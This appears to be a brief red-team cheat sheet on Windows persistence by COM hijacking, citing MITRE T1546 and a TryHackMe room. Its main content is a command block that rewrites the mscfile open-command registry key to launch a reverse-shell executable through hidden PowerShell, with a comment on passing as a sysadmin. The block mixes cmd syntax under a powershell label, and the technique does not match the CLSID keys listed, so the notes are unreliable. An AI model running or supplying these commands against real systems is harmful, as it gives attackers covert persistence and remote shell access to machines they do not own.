# Windows Persistence COM Object Hijacking

[Microsoft learn - COM](https://learn.microsoft.com/en-us/windows/win32/com/component-object-model--com--portal) states: *"The Microsoft Component Object Model (COM) is a platform-independent, distributed, object-oriented system for creating binary software components that can interact. COM is the foundation technology for Microsoft's OLE (compound documents), ActiveX (Internet-enabled components), as well as others.


[MITRE T1546](https://attack.mitre.org/techniques/T1546/015/)

```powershell
# Or use regedit to look like a SysAdmin
set REG_KEY=HKEY_LOCAL_MACHINE\SOFTWARE\Classes\mscfile\shell\open\command
set CMD="powershell -windowstyle hidden C:\<reverse-shell.exe> <reverse-shell-commands>"
reg add %REG_KEY% /v "DelegateExecute" /d "" /f 
reg add %REG_KEY% /d %CMD% /f
reg query %REG_KEY%
```


Registry Keys:
- `HKEY_CLASSES_ROOT\CLSID`
- `HKEY_CLASSES_ROOT\WOW6432Node\CLSID`
## References

[iredteam COM Object Hijacking](https://www.ired.team/offensive-security/persistence/t1122-com-hijacking)
[Microsoft learn - COM](https://learn.microsoft.com/en-us/windows/win32/com/component-object-model--com--portal) 
[THM APT 28 Room](https://tryhackme.com/room/apt28inceptiontheory)